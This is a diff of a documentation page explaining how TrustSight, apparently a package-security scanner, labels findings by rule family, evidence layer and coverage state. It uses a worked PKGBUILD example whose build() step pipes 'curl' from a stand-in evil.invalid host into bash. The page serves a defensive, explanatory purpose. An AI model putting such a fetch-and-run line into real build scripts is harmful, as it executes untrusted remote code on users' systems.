@@ -1,4 +1,4 @@
-<!-- description: How TrustSight groups security evidence: rule families, evidence categories, coverage states, and what a layer label does and does not mean. -->
+<!-- description: How TrustSight groups security evidence: rule families, evidence categories, the layer profile, coverage states, and what a layer label does and does not mean. -->
 
 # How TrustSight groups security evidence
 
@@ -7,90 +7,108 @@ for different warning signs: suspicious commands, changes to package
 structure, attempts to hide behaviour, unusual activity relative to a
 package's history, and patterns shared by several packages.
 
-A rule's **family** (its series) says *how the rule works*. Its **subject**
-(its category) says *what it looks for*. Its **evidence category** (its layer)
-groups the evidence the finding represents.
+Every rule carries three labels. Its **family** (the series letter) says *how it
+works*. Its **subject** (category) says *what it looks for*. Its **evidence
+category** (layer, `L1`-`L8`) says *what kind of evidence the finding is*. The
+[glossary](reference/glossary.md) defines the whole vocabulary; this section
+shows how the labels read in a report.
 
 These labels help you read a report. They are **not** a sequence of security
-barriers: a finding at L4 does not prove an attacker passed through L1, L2 and
-L3, and a layer with no finding is not proof a package is safe.
+barriers: a finding at `L4` does not prove an attacker passed through `L1`, `L2`
+and `L3`, and a layer with no finding is not proof a package is safe.
 
 ## A worked example
 
-You review a package whose update changes its `source=` line and adds a build
-step:
+You review a package whose update bumps the version, repoints its `source=`
+line, and adds a command to `build()`:
 
 ```diff
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,14 +1,15 @@
  pkgname=demo
 -pkgver=1.0
 +pkgver=1.1
- source=('https://example.invalid/demo-1.0.tar.gz')
+ pkgrel=1
+ pkgdesc="Demo package"
+ arch=('x86_64')
+ url="https://example.invalid"
+ license=('MIT')
+-source=('https://example.invalid/demo-1.0.tar.gz')
++source=('https://evil.invalid/demo-1.1.tar.gz')
+ sha256sums=('SKIP')
+ 
+ build() {
+   cd "$srcdir/demo-$pkgver"
 +  curl -fsSL https://evil.invalid/x.sh | bash
+   make
+ }
 ```
 
-The report says, in the default (human) render:
+The default report renders the findings and the change summary:
 
 ```
 demo 1.0 -> 1.1
-  Demo: version bump.
-  Signals: Remote Script Execution: curl ... | bash [R001].
+  Version bump. modified PKGBUILD.
+  Signals: Remote Script Execution: curl ... | bash [R001];
+    Source URL classified as unknown (https://evil.invalid/demo-1.1.tar.gz);
+    Uses curl in PKGBUILD [R010].
   Evidence categories fired: L3 (Payload signature). Review the diff before building.
 ```
 
-What that means:
+Two findings fired: `R001` (Remote Script Execution) and `R010` (Uses curl in
+PKGBUILD). Both are regex checks in the `R` family, so both carry the same
+evidence category, `L3` (Payload signature), and the verdict names that one
+category. The unknown `source=` domain is a prior, not a rule finding, so it does
+not name a layer.
 
-- **L3 (payload signature)** fired: a rule (`R001`) matched a change shaped
-  like a fetch piped into a shell. That is positive evidence of a known
-  suspicious pattern.
-- The layer label records *which kind of check produced the finding*. It does
-  not mean an attacker reached L3 after passing L1 and L2.
-- The verdict names the fired evidence categories and ends with a direction to
-  review. It is input to your decision, not the decision.
-
-Now suppose the same diff is cut short (a truncated paste). The report adds:
+The full layer profile is in the report's `layers` object, one entry per
+category:
 
 ```
-  Not vetted: the diff exceeded the size cap, so only its first bytes were examined
+L1  Structural coherence     passed
+L2  Readability              passed
+L3  Payload signature        fired          (R001, R010)
+L4  Evasion shape            passed
+L5  Behavioral suspicion     passed
+L6  Ecosystem memory         passed
+L7  Known indicators         passed
+L8  Campaign correlation     not_applicable  (a single package has no cross-package input)
 ```
 
-and the L3 layer's coverage becomes **incomplete** in the machine-readable
-report, even though R001 still fired. Finding something and having read
-everything are two separate facts, and the report keeps them separate.
+Reading it down:
 
-## The concepts
+- **`L3 fired`** because two `R` rules matched the new `curl ... | bash` line.
+  The label records *which kind of check* produced the finding. It does not mean
+  an attacker reached `L3` after passing `L1` and `L2`.
+- **`L1 passed`** because the change was read in full and no `C` or `M` rule
+  matched. It is not a certificate of safety, only the fact that this category
+  was read and stayed silent.
+- **`L8 not_applicable`** because a single package has no neighbours to compare
+  against; the check could not run at all. This is different from `passed`.
 
-**Rule family (series).** How the rule reaches its conclusion: a regex match
-(R), a structural invariant over parsed documents (C), a graph walk (D), a
-heuristic (H), an evasion/refusal check (X), a statistic (E), a history read
-(T), a cross-package correlation (G), an indicator lookup (I), a predicate
-over findings (M), or an artifact inspection (A). `P` reports declared
-practices and `W` reports analysis boundaries; neither is a detection.
+## Detection and coverage are two facts
 
-**Evidence category (layer).** The kind of evidence a finding represents. The
-eight labels are listed in [Part 1](assurance-layers/evidence-categories.md). A finding
-is labelled by *the check that produced it*, not by every other check it might
-complement.
+The profile keeps two independent dimensions, so a finding never hides that its
+category was also unread, and an unread category never hides a finding:
 
-**Shared dependencies.** Different algorithms are not automatically
-independent. Two checks that use different rules can both depend on the same
-tokenizer or history database, so one input-handling failure can blind both.
-Each rule family names the infrastructure it shares
-([`trustsight.detectors`](assurance-layers/enforcement.md)).
-
-**Coverage.** Whether a category could be assessed at all. A category can have
-a finding *and* incomplete coverage at the same time.
-
-## Reading the layer report
-
-| Category | Detection | Coverage | What it means |
+| | coverage `complete` | coverage `incomplete` | coverage `not_applicable` |
 |---|---|---|---|
-| L3 Payload signature | fired | complete | A rule matched a known suspicious pattern. |
-| L3 Payload signature | none | complete | The input was fully available and no rule in this category matched. This is **not** a safety certificate. |
-| L1-L4 | any | incomplete | A value could not be resolved or the diff was truncated, so the category was not fully assessed. |
-| L8 Campaign correlation | none | not applicable | A single-package review has no cross-package input; the check did not run. |
+| detection `fired` | found it, and read the whole change | found it, but only part of the change was read | cannot happen |
+| detection `none` | read the whole change, nothing matched (**not** a safety certificate) | only part of the change was read, so this silence is not evidence | the check could not run (e.g. `L8` on one package) |
 
-The two dimensions are recorded separately so that a finding never hides an
-unread category, and an unread category never hides a finding.
+Now suppose the same diff is cut short (a truncated paste). The report adds a
+not-vetted note, and `L3`'s coverage flips to `incomplete` while its detection
+stays `fired`:
+
+```json
+"L3": {"name": "Payload signature", "detection": "fired",
+       "coverage": "incomplete", "status": "fired", "findings": ["R001", "R010"]}
+```
+
+Finding something and having read everything are two separate facts, and the
+report keeps them separate. Content truncation blinds every layer, so the whole
+profile shifts to `incomplete` except `L8`, which stays `not_applicable`.
 
 ## What the model does not mean
 
@@ -114,6 +132,7 @@ unread category, and an unread category never hides a finding.
 
 ## See Also
 
+- [Glossary](reference/glossary.md) - family, subject, layer, tier, and the report terms
 - [Rule Nature](reference/rules/nature.md) - the rule families in full
 - [Rules Reference](reference/rules/index.md) - the catalog by category
 - [The security model](security.md) - the threat model this section complements
